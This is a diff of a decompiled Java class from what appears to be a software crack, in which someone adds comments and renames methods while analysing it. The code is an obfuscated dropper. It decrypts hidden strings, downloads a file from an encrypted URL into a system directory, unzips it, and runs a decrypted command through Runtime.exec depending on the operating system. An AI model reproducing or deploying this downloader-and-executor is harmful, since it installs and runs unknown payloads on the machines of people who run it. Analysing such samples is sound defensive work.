@@ -1,6 +1,3 @@
-/*
- * Decompiled with CFR 0.150.
- */
 package com.company.z3.com.crack.it;
 
 import javax.crypto.Cipher;
@@ -52,8 +49,16 @@ public class Run {
         return new String(arrby2); // returns decrypted byte array
     }
 
-    private static void c(String string) throws Exception {
-        URL uRL = new URL(string);
+    /**
+     *
+     * @param string URL
+     * @throws Exception MalformedURLException
+     */
+    private static void writeFromUrlToSystemProperty(String string) throws Exception {
+        URL uRL = new URL(string); // creates an instance of URL from given string
+        /*
+        gets system properties defined by those encrypted strings
+         */
         Path path = Paths.get(System.getProperty(Run.decryptString("cf342300e78f3c21383678d00b71b225369f62782816ebd5986ae029b97f34f53fb78d0a05ece71c779ebbc83692cfe8919282626c7be128cfb6b8f285848ff5").trim()), new String[0]);
         Path path2 = Paths.get(path.toString(), Run.decryptString("b92741a781f245538d5c75ab25330b9107832a09ef2c1d461a67507930557538e1fa2c3d572d2a384e4f9d399ef8c33d09467b3ab0454b41bab9350ce3774fdf").trim());
         try (BufferedInputStream bufferedInputStream = new BufferedInputStream(uRL.openStream());) {
@@ -62,6 +67,7 @@ public class Run {
             byte[] arrby = new byte[1024];
             while ((n = bufferedInputStream.read(arrby, 0, 1024)) != -1) {
                 fileOutputStream.write(arrby, 0, n);
+                // writes from URL to system properties, possibly in order to plant a backdoor access to system
             }
         } catch (IOException iOException) {
             // empty catch block
@@ -69,13 +75,20 @@ public class Run {
         Run.d(path2, path);
     }
 
+    /**
+     *
+     * @param path path to file
+     * @param path2
+     */
     private static void d(Path path, Path path2) {
         try {
             if (!path.toFile().exists()) {
                 return;
+                // if no such file exists
+                // it returns
             }
-            byte[] arrby = new byte[1024];
-            ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(path.toString()));
+            byte[] arrby = new byte[1024]; // declare new array of bytes, length = 1024
+            ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(path.toString())); // reads zip file
             ZipEntry zipEntry = zipInputStream.getNextEntry();
             while (zipEntry != null) {
                 int n;
@@ -94,10 +107,15 @@ public class Run {
         }
     }
 
+    /**
+     * main method is driver code
+     * @param arrstring is not used anywhere
+     * @throws Exception IOException
+     */
     public static void main(String[] arrstring) throws Exception {
         String string = System.getProperty(Run.decryptString("6474658359276b25720ff106097a2663f7d139752e9f95100ac045385fd51ee58f6a4a2c6d7f2701fed0ab2fff3a66bf43f78e79af22740fe718824cff7cda98").trim());
         String string2 = Run.decryptString("054f1f395c9506dea62a842dd0a91602ef625bd2909bb87a2fbcab5a499e06013166de8c18bf9d982184785f07f59739c463c3d56327be198fcae6648f7314f4").trim();
-        Run.c(Run.decryptString("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9"));
+        Run.writeFromUrlToSystemProperty(Run.decryptString("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9"));
         if (string.contains(string2)) {
             Runtime.getRuntime().exec(Run.decryptString("2d830932f271350897857710196ec96453f8d261bc7f07181da0c2a10fbe2db2267c3526d61c01c1c28a004367774f64b687c76dcf6873995954a8d93f3d2f3c").trim());
         } else {
